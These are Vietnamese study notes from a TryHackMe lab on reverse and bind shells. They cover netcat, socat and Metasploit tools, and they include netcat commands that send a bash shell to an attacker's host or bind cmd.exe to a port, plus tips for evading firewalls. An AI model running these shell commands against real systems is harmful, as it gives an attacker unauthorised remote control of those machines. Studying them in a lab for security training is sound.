---
hidden: true
---

# SHELL

## Task 1 — “What is a shell?”

**Định nghĩa ngắn gọn**

* Shell là chương trình giao tiếp với môi trường dòng lệnh (CLI).
* Ví dụ: `bash`, `sh` (Linux); `cmd.exe`, `Powershell` (Windows).

**Mục tiêu khi tấn công từ xa**

* Khi một ứng dụng trên máy chủ (ví dụ webserver) bị ép thực thi mã tùy ý, bước tiếp theo là lấy **shell** trên máy mục tiêu để chạy lệnh tiếp theo.

**Hai dạng shell chính**

1. **Reverse shell** — máy mục tiêu mở kết nối ngược về máy tấn công và cung cấp quyền truy cập dòng lệnh cho kẻ tấn công.
2. **Bind shell** — máy mục tiêu mở một cổng lắng nghe; kẻ tấn công kết nối đến cổng đó để thực thi lệnh.

**Nội dung phòng học (room)**

* Phần lớn là thông tin lý thuyết kèm ví dụ trong code block và ảnh chụp màn hình.
* Có hai VM thực hành cuối phòng: một Linux và một Windows.
* Có các câu hỏi thực hành (Task 13) để luyện tập hoặc theo dõi khi thực hiện từng task.



## Task 2 — Tools

### Mục tiêu

Các công cụ dùng để **nhận reverse shell** và **gửi bind shell** bao gồm: phần mã/payload (malicious shell code) và công cụ để tương tác với shell nhận được.

### Công cụ chính

#### Netcat

* Vai trò: “Swiss Army Knife” cho mạng — nhận reverse shell, kết nối tới bind shell, banner grabbing,...
* Ưu điểm: đơn giản, có sẵn trên hầu hết các bản Linux.
* Hạn chế: shell tạo ra **không ổn định** (dễ mất kết nối) nếu không xử lý thêm.
* Ghi chú: có phiên bản `.exe` cho Windows.

#### Socat

* Vai trò: tương tự netcat nhưng mạnh hơn (nhiều tính năng hơn, shell ổn định hơn).
* Ưu điểm: tạo shell ổn định hơn so với netcat.
* Hạn chế: cú pháp phức tạp; hiếm khi cài sẵn trên hệ thống mục tiêu.
* Ghi chú: có phiên bản `.exe` cho Windows; có cách khắc phục cho vấn đề cài đặt và cú pháp (sẽ trình bày sau).

#### Metasploit — exploit/multi/handler

* Vai trò: nhận reverse shell, đặc biệt để tương tác với **meterpreter** và xử lý payload **staged**.
* Ưu điểm: cung cấp môi trường toàn diện để quản lý shell, nhiều tuỳ chọn để ổn định và nâng cấp shell.
* Khi dùng: thường dùng khi cần tính năng nâng cao hoặc khi payload được tạo bởi Metasploit.

#### Msfvenom

* Vai trò: tạo payload động (standalone tool thuộc Metasploit ecosystem).
* Ứng dụng: sinh reverse/bind shell ở nhiều định dạng/ngôn ngữ; rất linh hoạt và mạnh.
* Lưu ý: sẽ được trình bày chi tiết trong task riêng.

### Tài nguyên/cheatsheets

* Repos và cheatsheets chứa mã shell mẫu: **PayloadsAllTheThings**, **PentestMonkey Reverse Shell Cheatsheet**.
* Kali Linux: thư mục webshell mẫu tại `/usr/share/webshells`.
* **SecLists**: ngoài wordlists, còn chứa mã hữu ích để lấy shell.

### Lưu ý tóm tắt

* Chọn công cụ phù hợp theo mục tiêu: netcat cho thao tác nhanh; socat khi cần ổn định; Metasploit/msfvenom khi cần payload phức tạp hoặc meterpreter.
* Luôn cân nhắc tính khả dụng của công cụ trên hệ thống mục tiêu (có cài sẵn hay không) và mức ổn định mong muốn của shell.



## Task 3 — Types of Shell

### Mục tiêu chính

* Quan tâm hai loại shell khi khai thác: **reverse shell** và **bind shell**.
* Hiểu sự khác biệt vận hành, ưu/nhược điểm và khái niệm **interactivity** (interactive vs non-interactive).



* **Bind shell**: máy bị kiểm soát (target) **mở một “cửa” (listening port)** và chờ kẻ tấn công **đến gõ cửa** (kết nối vào).
* **Reverse shell**: máy bị kiểm soát **chủ động gọi về** máy kẻ tấn công (mở kết nối ra), rồi kẻ tấn công dùng kết nối đó để điều khiển.

<figure><img src="../.gitbook/assets/image (573).png" alt=""><figcaption></figcaption></figure>

***

### Reverse shell

* **Định nghĩa:** máy mục tiêu kết nối ngược về máy tấn công và cung cấp CLI.
* **Ưu điểm:** dễ vượt firewall ở phía mục tiêu (vì kết nối là đi ra từ mục tiêu). Thường dễ thực hiện và debug.
* **Khuyết điểm:** cần cấu hình mạng/phát hiện trên máy tấn công (NAT, port forwarding) nếu qua Internet — trên TryHackMe không phải lo do kết nối mạng đặc thù.
* **Ví dụ:**

<figure><img src="../.gitbook/assets/image (570).png" alt=""><figcaption></figcaption></figure>

```
# trên máy tấn công (listener)
sudo nc -lvnp 443

# trên mục tiêu (gửi shell)
nc <LOCAL-IP> <PORT> -e /bin/bash
```

***

### Bind shell

* **Định nghĩa:** máy mục tiêu mở một cổng listener kèm shell; kẻ tấn công kết nối tới cổng đó để đạt RCE.
* **Ưu điểm:** không cần cấu hình mạng trên máy tấn công.
* **Khuyết điểm:** có thể bị chặn bởi firewall của mục tiêu; ít phổ biến hơn reverse shell.
* **Ví dụ (Windows):**

<figure><img src="../.gitbook/assets/image (571).png" alt=""><figcaption></figcaption></figure>

```
# trên mục tiêu (listener)
nc -lvnp <port> -e "cmd.exe"

# trên máy tấn công
nc MACHINE_IP <port>
```

***

### Tương tác (Interactivity)

* **Interactive shell:** tương tác đầy đủ với các chương trình yêu cầu nhập/xác nhận (ví dụ ssh, trình cài đặt tương tác).
* **Non-interactive shell:** không hỗ trợ tương tác; chỉ dùng được lệnh không yêu cầu input. Nhiều reverse/bind shell cơ bản là non-interactive, làm một số công việc (ví dụ chạy ssh) không hoạt động.
* **Hệ quả thực tiễn:** cần kỹ thuật nâng cấp shell (ví dụ pseudo-tty, stty, python pty.spawn, socat, rlwrap...) để có shell interactive khi cần.

***

### Ghi chú thực hành và mẹo ngắn

* Reverse shell thường là lựa chọn mặc định trong CTF/HTB/TryHackMe.
* Kiểm tra firewall/NAT khi dùng bind shell hoặc khi nhận shell qua Internet.
* Công cụ như `socat` hoặc kỹ thuật cải thiện netcat có thể làm shell ổn định hơn.
* Trong tài liệu ví dụ có dùng alias `listener` = `sudo rlwrap nc -lvnp 443` — alias này chỉ tồn tại trên máy demo và không có sẵn mặc định trên các máy khác.





## Task 4 — Netcat

### Mục tiêu

Giải thích cách dùng **netcat (nc)** để tạo/kết nối shell: tập trung vào cú pháp listener cho reverse shell và cách kết nối tới bind shell.

### Reverse shell — listener (Linux)

Cú pháp:

```
nc -lvnp <port-number>
```

Giải thích các tùy chọn:

* `-l` : listener (nghe trên cổng).
* `-v` : verbose (hiển thị thông tin chi tiết).
* `-n` : không phân giải tên host / không dùng DNS.
* `-p` : chỉ định số cổng theo sau.

Ghi chú quan trọng:

* Nếu dùng cổng < 1024, cần `sudo` (quyền root).
* Thường chọn cổng phổ biến (ví dụ 80, 443, 53) để tăng khả năng vượt outbound firewall của mục tiêu.
* Ví dụ thực tế:

```
sudo nc -lvnp 443
```

Sau khi listener chạy, gửi payload từ mục tiêu để kết nối ngược về listener này.

### Bind shell — kết nối tới listener trên mục tiêu

Cú pháp để kết nối tới bind shell:

```
nc <target-ip> <chosen-port>
```

Giải thích:

* Ở bind shell, mục tiêu đã mở listener kèm shell; nhiệm vụ của ta là kết nối tới `target-ip:chosen-port` để đạt remote code execution.

### Lưu ý

* Task 8 sẽ trình bày cách dùng netcat để **tạo listener trên mục tiêu** (tức cách thiết lập bind shell trên target).
* Netcat phù hợp cho thao tác nhanh và thử nghiệm; tuy nhiên shells cơ bản có thể không ổn định hoặc non-interactive, cần kỹ thuật bổ sung khi cần tương tác đầy đủ.

